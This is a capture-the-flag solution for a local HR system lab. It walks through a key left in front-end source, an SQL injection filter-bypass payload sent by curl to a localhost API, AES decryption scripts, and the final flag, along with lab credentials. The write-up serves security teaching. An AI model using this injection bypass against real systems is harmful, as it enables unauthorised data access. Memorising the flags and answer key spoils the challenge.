# CTF 3: HR System - Multi-Stage Challenge Solution

## Overview
This CTF involves 4 flags total:
1. **Flag 1**: Your personal flag (easily accessible)
2. **Flag 2**: Hidden decryption key (found in source code)
3. **Flag 3**: Encrypted flag (revealed via SQL injection)
4. **Flag 4**: Final flag (decrypt Flag 3 using Flag 2)

## Credentials
Login with one of these accounts:
- `abcd12` / `RVIFLBfM`
- `efgh34` / `bcgxO1ZkSle`
- `ijkl56` / `kH0g5imYtZ`

## Stage 1: Get Your Personal Flag

1. Login to the HR System at http://localhost:5174
2. Navigate to the Flag page (usually accessible from the dashboard)
3. Your personal flag is displayed: `durham-hr{your_unique_flag}`

## Stage 2: Find the Encryption Key

The dashboard shows 4 employees but only 3 are visible in the employee list. Something is hidden!

**Hunt for clues in the frontend source code:**

1. Open browser DevTools (F12) → Sources tab
2. Look through JavaScript/TypeScript files
3. Find `legacyAuth.ts` or similar legacy files
4. The key is hidden in a comment:

```
Key: CTF_2026_SECRET_KEY_XJ9K2L
```

**Alternative method**: View page source and search for "legacy" or "AES" or "key"

## Stage 3: SQL Injection to Reveal Hidden Employee

The employee search has a "security" filter, but it's bypassable!

**The Filter:**
- Blocks: `' OR 1=1--` (spaces around OR are detected)
- Allows: `'OR...` (no space after the quote)

**The Bypass Payload:**
```
'OR u.username='flag12'--
```

**How to execute:**

Using the API directly:
```bash
# Get token first
TOKEN=$(curl -s -X POST http://localhost:8004/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"abcd12","password":"RVIFLBfM"}' | jq -r '.token')

# Execute SQL injection
curl -s "http://localhost:8004/api/employees?search=%27OR%20u.username%3D%27flag12%27--" \
  -H "Authorization: Bearer $TOKEN"
```

**What you'll find:**
```json
{
  "employee_id": "FLAG012",
  "position": "System Auditor",
  "notes": "AES-256-CBC encrypted data: +DUi/1MfXD1MDdwdvzE2YA==:uj1qPXtZow7ovD1UgKZT6PAmDWWZScvFnJqgpxY4bsWeApZZ7pZY4GN64Fa1SBj6 (hint: check legacy code for the key)"
}
```

## Stage 4: Decrypt the Final Flag

Now you have:
- **Encrypted data**: `+DUi/1MfXD1MDdwdvzE2YA==:uj1qPXtZow7ovD1UgKZT6PAmDWWZScvFnJqgpxY4bsWeApZZ7pZY4GN64Fa1SBj6`
- **Key**: `CTF_2026_SECRET_KEY_XJ9K2L`
- **Algorithm**: AES-256-CBC

**Decryption Script (Node.js):**
```javascript
const crypto = require('crypto');

const encryptedData = '+DUi/1MfXD1MDdwdvzE2YA==:uj1qPXtZow7ovD1UgKZT6PAmDWWZScvFnJqgpxY4bsWeApZZ7pZY4GN64Fa1SBj6';
const passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L';

const [ivBase64, ciphertextBase64] = encryptedData.split(':');
const iv = Buffer.from(ivBase64, 'base64');
const ciphertext = Buffer.from(ciphertextBase64, 'base64');

// Derive key using SHA256
const key = crypto.createHash('sha256').update(passphrase).digest();

const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
let decrypted = decipher.update(ciphertext, undefined, 'utf8');
decrypted += decipher.final('utf8');

console.log('Decrypted flag:', decrypted);
```

**Decryption Script (Python):**
```python
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import base64

encrypted_data = '+DUi/1MfXD1MDdwdvzE2YA==:uj1qPXtZow7ovD1UgKZT6PAmDWWZScvFnJqgpxY4bsWeApZZ7pZY4GN64Fa1SBj6'
passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L'

iv_b64, ciphertext_b64 = encrypted_data.split(':')
iv = base64.b64decode(iv_b64)
ciphertext = base64.b64decode(ciphertext_b64)

# Derive key using SHA256
key = SHA256.new(passphrase.encode()).digest()

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)

# Remove PKCS7 padding
pad_len = decrypted[-1]
decrypted = decrypted[:-pad_len].decode('utf-8')

print('Decrypted flag:', decrypted)
```

**Online Alternative:**
Use CyberChef with:
1. From Base64 (for IV and ciphertext separately)
2. AES Decrypt with CBC mode
3. Key: SHA256 hash of `CTF_2026_SECRET_KEY_XJ9K2L`

## Final Flag

```
durham-hr{h1dd3n_3mpl0y33_4dv4nc3d_sql1_m4st3r}
```

## Summary of Techniques Used

| Stage | Technique | Skill Level |
|-------|-----------|-------------|
| 1 | Basic authentication | Beginner |
| 2 | Source code analysis | Beginner-Intermediate |
| 3 | SQL Injection (filter bypass) | Intermediate-Advanced |
| 4 | AES-256-CBC decryption | Intermediate |

## Key Vulnerabilities

1. **Information Disclosure**: Encryption key stored in frontend source code
2. **SQL Injection**: Bypassable filter using no-space technique
3. **Hidden Data**: Employee visible in count but filtered from list
